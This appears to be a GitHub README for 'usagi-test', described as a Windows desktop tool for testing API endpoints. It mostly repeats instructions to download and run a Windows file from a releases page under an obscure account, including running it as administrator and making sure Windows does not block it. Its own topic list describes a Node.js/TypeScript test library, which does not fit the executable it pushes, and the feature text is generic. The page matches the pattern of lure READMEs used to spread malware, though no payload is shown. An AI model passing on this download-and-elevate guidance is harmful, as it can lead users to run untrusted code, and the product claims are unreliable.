# 🐟 usagi-test - Simple API testing for Windows

[![Download usagi-test](https://img.shields.io/badge/Download%20usagi--test-blue?style=for-the-badge)](https://github.com/autographic-machinery71/usagi-test/releases)

## 🚀 What this app is

usagi-test is a desktop-friendly tool for checking API endpoints on Windows. It helps you send test requests, inspect results, and compare responses without setting up a full test stack first.

It is built for Node.js-based API testing and works well for quick checks, repeatable tests, and local development.

## 📥 Download

Visit this page to download: [usagi-test releases](https://github.com/autographic-machinery71/usagi-test/releases)

Open the link, find the latest release, and download the Windows file that matches your system. If there is more than one file, choose the one marked for Windows.

## 🪟 Install on Windows

1. Open the [releases page](https://github.com/autographic-machinery71/usagi-test/releases)
2. Find the newest release at the top
3. Download the Windows file
4. Open your Downloads folder
5. Double-click the file to start it
6. If Windows asks for approval, choose Run or Yes
7. Follow the steps on screen until the app opens

If the file comes in a .zip archive:

1. Right-click the zip file
2. Choose Extract All
3. Open the extracted folder
4. Double-click the app file inside

## 🧭 First run

When you open usagi-test for the first time, you can start with a simple API check:

1. Enter the API URL you want to test
2. Choose the request type, such as GET or POST
3. Add any headers your API needs
4. Add a request body if your endpoint expects one
5. Click the button to send the request
6. Review the response on the screen

You do not need to set up a project first. The app is meant to keep the process simple.

## 🔧 What you can do with it

- Test API endpoints from one place
- Send common request types like GET, POST, PUT, and DELETE
- Add request headers for auth or content type
- Use fake data for repeatable tests
- Compare responses while you work
- Check local services during development
- Run tests with a setup that stays simple

## 🧪 Common use cases

### Local API checks

Use usagi-test when you want to confirm that a local service still works after a change. This is useful when you are building a Node.js app and want quick feedback.

### Mocked responses

The tool supports mocked API flows. That helps when a service is not ready yet or when you want to test a known response without calling a live server.

### Repeatable tests

If you need the same request sent many times, you can reuse the same setup. That makes it easier to spot changes in status codes, response body, or headers.

### Team testing

If more than one person works on the same API, usagi-test can help everyone follow the same request pattern and see the same output.

## 🖥️ System needs

usagi-test is made for Windows users who want a simple way to test APIs.

Recommended setup:

- Windows 10 or Windows 11
- Internet access for download
- A modern browser for the release page
- Enough disk space for the app and your test files
- A Node.js API or service to test against

## 🧰 How it fits your workflow

usagi-test works well if you want to:

- Test an API before adding it to a larger app
- Check a backend service during development
- Use a simple test tool instead of a heavy setup
- Work with TypeScript-based API projects
- Keep test requests in one place
- Use fake data to make tests easier to repeat

## 📁 Typical setup

A common setup looks like this:

- Your API runs on your computer or a test server
- usagi-test sends requests to that API
- The app shows the response code, body, and headers
- You change the request and test again

This helps when you need a fast way to see what your API returns.

## 🔍 Topics covered by this project

This project is built around:

- API testing
- Testing tools
- Node.js
- Supertest-style request checks
- TypeScript
- Vitest
- Mock Service Worker patterns
- Fake data generation

## ❓ If the app does not open

Try these steps:

1. Make sure the download finished
2. Check that you opened the right file
3. Try extracting the zip file if you downloaded one
4. Right-click the app and choose Run as administrator
5. Re-download the latest release if the file seems broken
6. Make sure Windows did not block the file

## 🔐 If your API needs login

If your endpoint uses auth, add the right header before sending the request. Common examples include:

- Authorization
- Content-Type
- Accept
- X-API-Key

## 📝 Example request flow

1. Open usagi-test
2. Paste the API URL
3. Choose GET to read data or POST to send data
4. Add the header your API expects
5. Add test data if needed
6. Send the request
7. Read the response and adjust your test

## 🧩 Why people use it

People use usagi-test when they want a simple way to test an API without moving through many setup steps. It helps keep the focus on the request and the response.

It is useful for:

- Small backend projects
- Early-stage API work
- Local development
- Checking changes before release
- Testing mock and live endpoints

## 📦 Release files

The release page may include one or more files for Windows. Choose the file that matches your system and download it from the [releases page](https://github.com/autographic-machinery71/usagi-test/releases)

## 🧭 Setup checklist

- Download the latest Windows release
- Open the file or extract the zip
- Allow Windows to run it
- Open the app
- Enter an API URL
- Send a test request
- Review the response
- Save your preferred setup for later use